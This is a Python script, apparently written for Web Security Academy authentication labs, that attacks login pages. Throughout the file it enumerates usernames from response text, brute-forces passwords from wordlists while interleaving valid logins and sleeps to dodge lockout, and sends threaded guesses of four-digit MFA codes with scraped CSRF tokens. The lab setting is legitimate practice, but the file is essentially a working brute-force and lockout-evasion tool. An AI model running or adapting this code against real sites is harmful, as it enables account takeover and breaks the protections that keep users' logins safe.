import requests
import time
import re
import concurrent.futures
passwords = []
usernames = []

url= 'https://0a5500c4039f443381389e21008200bf.web-security-academy.net/login'

def set_cookie():
     r = requests.get(url)
     cookie = r.cookies.values()
     cook = {'session':cookie[0]}
     return cook

cook =  set_cookie()

def enum_user():
    global cook
    count = 0
    with open(r'C:\Users\ADMIN\PycharmProjects\pythonProject\web-http\user.txt') as file:
        for i in file:

            if count == 3:
                payload = {'username': 'wiener', 'password': 'peter'}
                count =0
            else :
                payload = {'username': i.rstrip('\n'), 'password': 'pass'}
                count = count + 1



            r = requests.post(url,data=payload,cookies=cook)


            # if r.text.find('Invalid username'):
            #     print('username not found')
            #     print(r.text.find('Invalid username'))

            if r.text.find('Incorrect password') == -1:
                continue
            else:
                usernames.append(payload['username'])
                print(usernames)
                print(f"VALID ++ USERNAME IS {usernames}")
                break


def enum_pass(p1):
    global cook
    count = 1
    with open(r'C:\Users\ADMIN\PycharmProjects\pythonProject\web-http\pass.txt') as file:
        for i in file:
            if count == 3:
               time.sleep(60)
               count = 1
            else :
                payload = {'username': p1, 'password': i.rstrip('\n')}
                count = count + 1
            print(payload)
            r = requests.post(url, data=payload, cookies=cook,allow_redirects=False)

            # if r.text.find('Invalid username'):
            #     print('username not found')
            #     print(r.text.find('Invalid username'))

            # if r.text.find('Incorrect password') == True or :
            #     print('wrong password')
            # else:
            #     continue
            if r.text.find('You have made too many incorrect login attempt') > 0:
                print('too many attempts')
            if r.text.find('You have made too many incorrect login attempt') == -1:
                print(r.status_code)
            if payload['username'] == 'carlos':
                if r.status_code == 302:
                    print(r.status_code)
                    print(payload['password'])
                    break
                else:
                    continue


            # if r.text.find('Congratulations, you solved the lab!') == -1:
            #     continue
            # else:
            #     print(payload['password'])
            #     break






def real(p1,p2):
    global cook
    payload = {'username': p1, 'password': p2}
    print(payload)

    r = requests.post(url, data=payload, cookies=cook)
    print(r.text)
    print(r.status_code)
    print(r.headers)

#real('wiener','peter')


'''--ACCOUNT LOCK AFTER CERTAIN TRY--'''

def enum_username():
    global cook

    with open(r'C:\Users\ADMIN\PycharmProjects\pythonProject\web-http\user.txt') as file:
        for i in file:
            for y in range(5):
                payload = {'username': i.rstrip('\n'), 'password': 'pass'}
                print(payload)
                r = requests.post(url,data=payload,cookies=cook)


                # if r.text.find('Invalid username'):
                #     print('username not found')
                #     print(r.text.find('Invalid username'))

                if r.text.find('You have made too many incorrect login attempt') == -1:
                    continue
                else:
                    usernames.append(payload['username'])
                    print(usernames)
                    print(f"VALID ++ USERNAME IS {usernames}")
                    break


def enum_password(p1):
    global cook
    count =1
    with open(r'C:\Users\ADMIN\PycharmProjects\pythonProject\web-http\pass.txt') as file:
        for i in file:
            if count == 5:
                time.sleep(60)
                count = 1
            if count == 4:
                payload = {'username': 'acceso', 'password': 'peter'}
                print(payload)
                r = requests.post(url, data=payload, cookies=cook, allow_redirects=False)
                count = count + 1
                if r.text.find('You have made too many incorrect login attempt') > 0 :
                    print('too many attempts')
                    print(payload['password'])



            else:
                payload = {'username': p1, 'password': i.rstrip('\n')}
                print(payload)
                r = requests.post(url, data=payload, cookies=cook,allow_redirects=False)
                count = count +1

                if r.text.find('You have made too many incorrect login attempt') > 0 :
                    print('too many attempts')
                if r.text.find('You have made too many incorrect login attempt') == -1 :
                    print(r.status_code)
                if r.status_code == 302:
                    print(r.status_code)
                    print(payload['password'])
                    break
                else:
                    continue

def json_data(p2):

    global cook
    payload = {'username': 'wiener', 'password': p2}
    r = requests.post(url, json=payload, cookies=cook, allow_redirects=False)

    if r.status_code == 302:
        print(r.status_code)
        print(payload['password'])

    else:
        print("not found")


def crt_list():
    with open(r'C:\Users\ADMIN\PycharmProjects\pythonProject\web-http\pass.txt') as file:
        for i in file:
            passwords.append(i.rstrip('\n'))
        return passwords


'''
def login():
    try:
        payload = {'username': 'carlos', 'password': 'montoya'}
        print(payload)
        r = requests.post(url, data=payload, cookies=cook, allow_redirects=False)
        print(f"Request to {url} successful with status code: {r.status_code}, {print(time.time())}")
    except Exception as e:
        print(f"Request to {url} failed with exception: {e}")

    # Specify the URL you want to request

urls = "https://0a5500990454e3788234b0d10076006d.web-security-academy.net/"  # Replace with your actual URL

# Number of concurrent requests
num_requests = 1000

# Use ThreadPoolExecutor to send requests concurrently
with concurrent.futures.ThreadPoolExecutor() as executor:
    # Submit requests and get Future objects
    futures = [executor.submit(make_request, urls) for _ in range(num_requests)]

    # Wait for all requests to finish
    concurrent.futures.wait(futures)

# At this point, all requests have been completed
print("All requests completed.")'''

def get(url,cook1):
    r = requests.get(url,cookies=cook1)
    # Using regular expression to extract the value
    match = re.search(r'<input.*?name="csrf".*?value="(.*?)"', r.text)



    if match:
        csrf_value = match.group(1)
        return csrf_value
    else:
        print("CSRF value not found in the HTML string.")


def check(csrf,cook):
    payload = {'csrf': csrf,'username': 'carlos', 'password': 'montoya'}

    r = requests.post(url, data=payload, cookies=cook, allow_redirects=False)

    # if r.status_code ==302:
    #     #print("login --success")
    # else:
    #     print(r.text)

    match = re.search(r'session=([^;]+)', r.headers['Set-Cookie'])
    session_value = match.group(1)

    cookie = {'session': session_value}
    return cookie


def otp(url,csrf,cookie,pin):
    payload = {'csrf': csrf,'mfa-code': pin}
    #print("sending the pin")
    print(payload)
    r = requests.post(url, data=payload, cookies=cookie, allow_redirects=True)
    print(r.status_code)
    #print(f"Request to {url} successful with status code: {r.status_code}, {print(time.time())}")
    if r.status_code == 302:
        print('-----------------------------otp found-----------------------------')
        print('-----------------------------otp found-----------------------------')
        print('-----------------------------otp found-----------------------------')
        print('-----------------------------otp found-----------------------------')
        print(pin)
        print(csrf)
        print(cookie)
        print(r.text)
        print('-----------------------------otp found-----------------------------')
        print('-----------------------------otp found-----------------------------')
        print('-----------------------------otp found-----------------------------')
        print('-----------------------------otp found-----------------------------')




def checker(i):
    cook =set_cookie()

    csrf = get('https://0abb00eb0389c58884f12400001c008a.web-security-academy.net/login',cook)

    new_sess= check(csrf,cook)

    csrf = get('https://0abb00eb0389c58884f12400001c008a.web-security-academy.net/login2',new_sess)


    otp('https://0abb00eb0389c58884f12400001c008a.web-security-academy.net/login2',csrf,new_sess,i)




'''# Use ThreadPoolExecutor to send requests concurrently
with concurrent.futures.ThreadPoolExecutor() as executor:
    # Submit requests and get Future objects
    futures = [executor.submit(checker,i) for i in range(1000,9999)]


    # Wait for all requests to finish
    concurrent.futures.wait(futures)

# At this point, all requests have been completed
print("All requests completed.")'''

enum_pass('carlos')